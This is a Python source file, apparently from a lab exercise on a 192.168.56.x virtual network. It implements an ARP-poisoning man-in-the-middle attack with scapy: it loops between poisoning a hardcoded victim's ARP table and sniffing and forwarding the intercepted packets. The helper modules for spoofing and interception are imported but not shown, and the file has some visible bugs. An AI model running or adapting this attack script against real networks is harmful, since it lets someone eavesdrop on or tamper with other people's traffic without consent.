from time import sleep

from scapy.all import *
from scapy.layers.inet import IP, TCP
import threading
from threading import Lock
import arpSpoof
import util
import interceptor

lock = Lock()
networkInterface = "enp0s3"
victimIP = "192.168.56.101"
#victimMAC = "08:00:27:b0:a1:ab"

spoofIP = "192.168.56.102"
#serverMAC = "08:00:27:c6:a4:61"



# input : attacker MAC as str
# -target ip which has posioned arp tables  as str
# - array of ips which were posioned in victim table as array of str
# - network interface as str
# output:
# - send replay packet which will perform MIMA as follows
# - attacker will receive request from victim ip
# - performe that request and receive response from dst ip
# - and then send that resposne to the victim ip

class sniffer():
    def __init__(self, networkInterface, victimIP, spoofIP, attackerMAC):
        self.networkInterface = networkInterface
        self.victimIP = victimIP
        self.spoofIP = spoofIP
        self.attackerMAC = attackerMAC
        self.victimMAC = util.getMAC(victimIP, networkInterface) # get victim MAC adress
        self.serverMAC = [util.getMAC(ip, networkInterface) for ip in spoofIP]  # get array of MAC of poisoned ips in victim arp table
        self.interceptedPkt = []

    def startSniff(self):
        sniff(prn=self.intercept, iface=networkInterface, filter="ip", timeout = 20)

    def intercept(self, pkt):
        interceptor.intercept(pkt, self.interceptedPkt, self.attackerMAC, self.spoofIP, self.serverMAC, self.victimMAC, self.networkInterface)

    def spoof(self):
        arpSpoof.arpPoisoning(self.victimIP, self.spoofIP, self.networkInterface)

    def start(self):
        while (True):
            test.spoof()
            test.startSniff()

test = sniffer(networkInterface, [victimIP], [spoofIP], get_if_hwaddr(networkInterface))

test.start()
